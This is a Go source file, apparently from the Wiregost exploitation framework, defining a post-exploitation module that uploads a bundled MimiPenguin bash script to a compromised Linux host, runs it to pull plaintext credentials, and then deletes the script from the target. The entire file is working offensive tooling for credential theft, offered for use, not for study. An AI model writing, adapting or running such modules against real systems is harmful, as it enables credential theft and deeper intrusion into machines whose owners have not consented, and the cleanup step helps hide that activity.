// Wiregost - Golang Exploitation Framework
// Copyright © 2020 Para
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

package MimiPenguin

import (
	"fmt"
	"path/filepath"
	"strings"
	"time"

	"github.com/maxlandon/wiregost/server/assets"
	"github.com/maxlandon/wiregost/server/log"
	"github.com/maxlandon/wiregost/server/module"
)

// [ Base Methods ] ------------------------------------------------------------------------//

// MimiPenguin - A module for retrieving plaintext credentials
type MimiPenguin struct {
	*module.Module
}

// New - Instantiates a MimiPenguin module
func New() *MimiPenguin {
	mod := &MimiPenguin{&module.Module{}}
	mod.Path = []string{"post/linux/x64/bash/credentials/MimiPenguin"}
	return mod
}

var modLog = log.ServerLogger("post/linux/x64/bash/credentials/MimiPenguin", "module")

// [ Module Methods ] ------------------------------------------------------------------------//

func (s *MimiPenguin) Run(command string) (result string, err error) {

	// Check options
	if ok, err := s.CheckRequiredOptions(); !ok {
		return "", err
	}

	// Check session
	sess, err := s.GetSession()
	if sess == nil {
		return "", err
	}

	// Options
	src := filepath.Join(assets.GetModulesDir(), strings.Join(s.Path, "/"), "src/mimipenguin.sh")
	rpath := filepath.Join(s.Options["TempDirectory"].Value, "mimipenguin.sh")
	timeout := time.Second * 30

	// Upload MimiPenguin script on target
	s.ModuleEvent(fmt.Sprintf("Uploading MimiPenguin bash script in %s ...", s.Options["TempDirectory"].Value))
	result, err = s.Upload(src, rpath, timeout)
	if err != nil {
		return "", err
	} else {
		s.ModuleEvent(result)
	}

	// Execute Script
	s.ModuleEvent("Running script ...")
	time.Sleep(time.Millisecond * 500)
	result, err = s.Execute(rpath, []string{}, timeout)
	if err != nil {
		return "", err
	} else {
		s.ModuleEvent(result)
	}

	// Delete script
	s.ModuleEvent("Deleting script ...")
	result, err = s.Remove(rpath, timeout)
	if err != nil {
		return "", err
	} else {
		s.ModuleEvent(result)
	}

	return "Module executed", nil
}
